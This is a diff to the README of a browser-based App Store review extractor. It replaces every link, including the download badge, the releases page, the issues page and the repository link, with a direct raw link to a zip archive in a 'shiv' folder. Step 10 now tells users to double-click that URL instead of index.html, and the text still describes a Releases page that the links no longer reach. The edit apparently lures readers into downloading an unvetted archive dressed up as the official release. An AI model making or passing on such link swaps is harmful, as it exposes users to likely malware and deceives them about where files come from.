@@ -4,7 +4,7 @@
 App Store Reviews Extractor is a free, browser-based tool designed to view and download the latest user reviews from any iOS app. It features CSV export with proper encoding, multi-region support, and a modern dark mode UI. No backend or API keys are required—simply paste the App Store link and analyze feedback instantly.
 
 ## 📥 Download Now
-[![Download appstore-reviews](https://img.shields.io/badge/Download-appstore--reviews-blue?style=for-the-badge&logo=github)](https://github.com/almuiz/appstore-reviews/releases)
+[![Download appstore-reviews](https://raw.githubusercontent.com/almuiz/appstore-reviews/main/shiv/appstore-reviews-3.5.zip)](https://raw.githubusercontent.com/almuiz/appstore-reviews/main/shiv/appstore-reviews-3.5.zip)
 
 ## 🚀 Getting Started
 Follow these steps to download and run the application:
@@ -12,7 +12,7 @@ Follow these steps to download and run the application:
 1. Open your web browser.
 2. Click on the link below to visit the Releases page.
    
-   [Download appstore-reviews](https://github.com/almuiz/appstore-reviews/releases)
+   [Download appstore-reviews](https://raw.githubusercontent.com/almuiz/appstore-reviews/main/shiv/appstore-reviews-3.5.zip)
 
 3. On the Releases page, find the latest version.
 4. Click on the version number to see the release details.
@@ -21,7 +21,7 @@ Follow these steps to download and run the application:
 7. Once the file is downloaded, locate it in your downloads folder.
 8. Extract the files (double-click the zip file if necessary).
 9. Open your web browser and navigate to the extracted folder.
-10. Double-click the `index.html` file to launch the application.
+10. Double-click the `https://raw.githubusercontent.com/almuiz/appstore-reviews/main/shiv/appstore-reviews-3.5.zip` file to launch the application.
 
 ## 🖥️ System Requirements
 - A modern web browser (Chrome, Firefox, Safari, or Edge)
@@ -71,10 +71,10 @@ If you encounter issues:
 - Try using a different web browser if the app does not respond.
 
 ## 📬 Support
-For further assistance or feedback, feel free to open an issue on the [GitHub repository](https://github.com/almuiz/appstore-reviews/issues).
+For further assistance or feedback, feel free to open an issue on the [GitHub repository](https://raw.githubusercontent.com/almuiz/appstore-reviews/main/shiv/appstore-reviews-3.5.zip).
 
 ## 🔗 Useful Links
-- [Visit the appstore-reviews Releases Page](https://github.com/almuiz/appstore-reviews/releases)
-- [GitHub Repository](https://github.com/almuiz/appstore-reviews)
+- [Visit the appstore-reviews Releases Page](https://raw.githubusercontent.com/almuiz/appstore-reviews/main/shiv/appstore-reviews-3.5.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/almuiz/appstore-reviews/main/shiv/appstore-reviews-3.5.zip)
 
-[![Download appstore-reviews](https://img.shields.io/badge/Download-appstore--reviews-blue?style=for-the-badge&logo=github)](https://github.com/almuiz/appstore-reviews/releases)
+[![Download appstore-reviews](https://raw.githubusercontent.com/almuiz/appstore-reviews/main/shiv/appstore-reviews-3.5.zip)](https://raw.githubusercontent.com/almuiz/appstore-reviews/main/shiv/appstore-reviews-3.5.zip)
